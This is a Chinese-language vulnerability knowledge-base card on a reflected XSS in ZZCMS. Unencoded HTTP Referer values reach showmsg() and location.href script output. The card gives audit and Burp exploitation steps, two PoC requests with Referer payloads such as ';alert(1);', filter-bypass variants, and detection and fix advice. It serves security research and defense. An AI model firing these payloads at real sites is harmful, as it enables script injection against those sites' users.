---
id: web-generic-xss-referer-header-showmsg-reflection
title: ZZCMS 未过滤 Referer 头导致反射型 XSS：showmsg 与 location.href 拼接 HTTP_REFERER
type: scenario
domain: web
path: web/generic/xss
technique: referer-header-showmsg-reflection
tags:
- web
- xss
- reflected-xss
- referer
- http-header
- php
- cms
- zzcms
- code-audit
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V278
  verified_at: '2026-11-08T01:05:53+08:00'
  notes: 已对照原文与 img/02-12 核对：global.php 只对 $_REQUEST/$_GET/$_POST 做 addfxg(htmlspecialchars+addslashes)，对 $_SERVER 仅 strtolower(REQUEST_URI)，HTTP_REFERER 未编码；showmsg 把 $zc_url 拼进 parent.location="..."（img/06），g/list.php action=clearcookies 直接 echo location.href='...'$_SERVER['HTTP_REFERER']（img/12）；/ask/caina.php Referer ";alert(123);</script><script>" 与 g/list.php Referer ';alert(1);' 均实测弹窗（img/08-11）。卡片把 showmsg 与 direct echo 两个 sink 作为同一『未编码 Referer 进入 script 上下文』技术，payload/前置相同，仅闭合字符不同，判为单一原子保留；g/dl_liuyan_save.php 因原文数据库问题未复现，仅在变体注明。未复跑。dedup 候选路径反射/头注入 SQL/黑名单 XSS 均非同链。
url: /docs/web/generic/xss/web-generic-xss-referer-header-showmsg-reflection/
draft: false
kb_aliases:
- HTTP_REFERER XSS
- Referer 头反射型 XSS
- showmsg XSS
- ZZCMS XSS
- location.href 注入
- $_SERVER 未过滤
---

## 一句话结论

PHP CMS 的全局过滤只处理 `$_GET`/`$_POST`/`$_REQUEST`（`htmlspecialchars` + `addslashes`），不处理 `$_SERVER`；凡是把 `$_SERVER['HTTP_REFERER']` 拼进 `showmsg()` 的 JS 字符串或 `<script>location.href='...'` 的代码路径，都可被攻击者用可控的 Referer 头注入 `';alert(1);//` 一类 payload，形成反射型 XSS。

## 原理

- `$_SERVER['HTTP_REFERER']` 完全来自请求头 `Referer`，客户端可控：攻击者可以在自己页面的 URL 中放入 payload，诱导受害者点击指向目标的链接，或直接构造带自定义 Referer 的请求。
- ZZCMS 的 `global.php` 对 `$_REQUEST`/`$_GET`/`$_POST` 调用 `addfxg()`（内部为 `htmlspecialchars`，magic_quotes 关闭时再 `addslashes`），但对 `$_SERVER` 只执行 `strtolower($_SERVER['REQUEST_URI'])` 用于 SQL 注入关键词判断；`HTTP_REFERER` 没有经过任何 HTML/JS 编码。
- `showmsg($msg, $zc_url)` 把第二个参数原样拼进：
  `<script>alert('$msg');parent.location=\"$zc_url\";</script>`
  当传入 `$_SERVER['HTTP_REFERER']` 时，Referer 中的双引号可闭合 `parent.location` 的 JS 字符串，单引号/`</script>` 可进一步跳出脚本块，插入任意 JS。
- `g/list.php` 的 `action=clearcookies` 分支直接：
  `echo "<script>location.href='".$_SERVER['HTTP_REFERER']."'</script>";`
  Referer 中的单引号同样可闭合 JS 字符串并执行任意语句。
- 根因不是“Referer 可以伪造”，而是“来源头未经输出编码就进入脚本上下文”；全局过滤的覆盖范围遗漏 `$_SERVER`，以及部分文件未包含过滤文件，使这类 sink 长期可达。

## 触发条件

- PHP CMS 存在把 `$_SERVER['HTTP_REFERER']` 传给 `showmsg()`，或直接 `echo` 进 `<script>` / `location.href` 的代码路径。
- 全局过滤只覆盖请求数组，未覆盖 `$_SERVER`；或目标入口文件没有包含带过滤逻辑的公共文件。
- 攻击者能控制受害者的 Referer（诱导点击攻击者页面上的链接、iframe 跳转，或直接构造请求验证）。
- 目标未启用 CSP 等可阻断内联脚本的缓解措施。

## 利用步骤

1. 代码审计：从入口文件沿 `require`/`include` 跟到全局过滤文件，确认过滤函数只作用于 `$_GET`/`$_POST`/`$_REQUEST`，`$_SERVER` 仅被 `strtolower` 处理或被忽略。
2. 搜索 sink：`$_SERVER['HTTP_REFERER']`、`showmsg(`、`location.href=`、`echo` 拼接脚本、`parent.location=`。
3. 选择可达入口：本例 `/g/list.php` 的 `action=clearcookies` 分支直接回显 Referer；`/ask/caina.php` 在采纳成功/失败后调用 `showmsg('采纳成功', $_SERVER['HTTP_REFERER'])`。
4. 构造 Referer payload：根据上下文选择闭合字符，如 `';alert(1);//`、`";alert(1);//`、`</script><script>alert(1)</script>`。
5. 用 Burp 修改 `Referer` 头重放请求，观察响应中是否出现未转义的 `<script>...alert(...)...</script>`。
6. 诱导受害者访问该响应（或让浏览器以攻击者页面为来源发起请求），脚本在目标域执行；停止在弹窗验证，不进行破坏性操作。

## PoC

`g/list.php` 直接回显 Referer：

```http
POST /g/list.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Referer: ';alert(1);'

action=clearcookies
```

响应中出现：

```html
<script>location.href='';alert(1);''</script>
```

`ask/caina.php` 经 `showmsg()` 回显 Referer：

```http
POST /ask/caina.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Referer: ";alert(123);</script><script>"
```

响应中出现：

```html
<script>
  alert('采纳成功');
  parent.location="";alert(123);</script><script>";
</script>
```

```text
# 端点与参数以目标为准；Referer 在浏览器中可由攻击者页面 URL 间接控制，
# 也可在授权测试中直接用 Burp/curl 修改请求头验证。
```

## 变体与关联

- 变体：`g/dl_liuyan_save.php` 同样把 `$_SERVER['HTTP_REFERER']` 传给 `showmsg()`，是同一 sink 的另一入口；原文因数据库连接问题未复现成功，仅作待验证端点，未据此单独成卡。
- 变体：其他请求头（`User-Agent`、`X-Forwarded-For`、`Host`）也会进入 `$_SERVER`，若被回显到页面可形成同类反射型 XSS；XFF 写入日志后再展示则是存储型，见 [[web-generic-xss-h3blog-username-xff-log-stored-xss]]。
- 变体：目标过滤单引号时，尝试反引号、`</script>` 闭合、JS 十六进制/Unicode 编码或 `String.fromCharCode`。
- 关联：[[web-generic-xss-javascript-context-injection]]（JS 上下文闭合思路）、[[web-generic-xss-htmlspecialchars-single-quote-attribute]]（编码上下文差异）、[[web-generic-xss-filter-bypass-encoding-obfuscation]]（编码绕过）。
- 边界：目标对 Referer 做 HTML/JS 编码、`showmsg` 改用 `json_encode` 输出、或浏览器 Referrer-Policy 剥离来源时，本路径失效或需要额外诱导条件。

## 检测与防御

- 检测：代码搜索 `$_SERVER['HTTP_REFERER']` 进入 `echo`/`<script>`/`location.href`；页面/响应中出现 Referer 原值；访问日志中出现含 `<script>`、`alert(`、引号闭合的 Referer。
- 修复：按输出上下文编码；JS 字符串使用 `json_encode`，URL 使用 `urlencode` 并校验协议/域名白名单；不要把 Referer 原样拼进 `<script>`。
- 加固：全局过滤覆盖 `$_SERVER` 中的可控请求头；对 `showmsg` 的跳转参数做同源/相对路径校验；启用 CSP 禁止内联脚本，降低反射型 XSS 的可利用性。
